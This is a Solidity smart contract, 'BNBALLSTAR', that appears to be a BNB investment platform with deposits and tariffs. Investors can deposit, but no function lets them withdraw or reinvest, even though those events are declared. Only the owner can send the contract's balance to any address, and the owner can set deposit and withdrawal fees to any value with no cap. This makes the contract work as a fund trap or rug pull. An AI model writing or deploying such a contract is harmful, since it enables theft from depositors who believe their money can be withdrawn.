contract BNBALLSTAR{
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
   Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
 
  event OwnershipTransferred(address);
  
  address public owner = msg.sender;
             receive() external payable{}
  uint public totalInvestors;
  uint public totalInvested;
  uint public withdrawFee;
  uint public  depositfees ;
  address public contractAddr = address(this);
  address payable  public feesAddress;
  address  newFeesAddress;  
  
  
  mapping (address => Investor) public investors;
  event DepositAt(address user, uint amount);
  event Reinvest(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);

  
 constructor() {
        feesAddress = payable(msg.sender);
        withdrawFee = 5;
    }

  function deposit() external payable {
        uint tariff = 0;
        require(msg.value >= 0);
        if(investors[msg.sender].registered){
            require(investors[msg.sender].deposits[0].tariff == tariff);
        }
    
        uint amount = msg.value; 

      uint256 fees = amount*depositfees/100;
        feesAddress.transfer(fees);

        amount = amount-fees;
        
        investors[msg.sender].invested += amount;
        totalInvested += amount;
        
        investors[msg.sender].deposits.push(Deposit(tariff, amount, block.timestamp));
        emit DepositAt(msg.sender,  amount);
    } 
   
    // Only owner can withdraw BNB 
      function withdrawbnb(address payable to, uint amount) public returns(bool) {
        require(msg.sender == owner, "Only owner");
        require(to != address(0), "Cannot send to zero address");
             uint256 withfees = amount*withdrawFee/100;
          feesAddress.transfer(withfees);
                    amount = amount-withfees;
        to.transfer(amount);
        return true;
    }   


    // Only owner can call this function
    function transferOwnership(address to) public returns(bool) {
        require(msg.sender == owner, "Only owner");
        require(to != address(0), "Cannot transfer ownership to zero address");
        owner = to;
        emit OwnershipTransferred(to);
        return true;
    }


 function updateFeesAddress(address _newFeesAddress) external {
    require(msg.sender == owner, "Only owner");
    require(_newFeesAddress != address(0), "Invalid address");
    feesAddress = payable(_newFeesAddress);
}



 function updateWithdrawalFees(uint _withdrawFee) external {
    require(msg.sender == owner, "Only owner");
    withdrawFee = _withdrawFee;
}       


function updatedepositfees(uint _depositfee) external {
    require(msg.sender == owner, "only owner");
    depositfees = _depositfee;

}



}
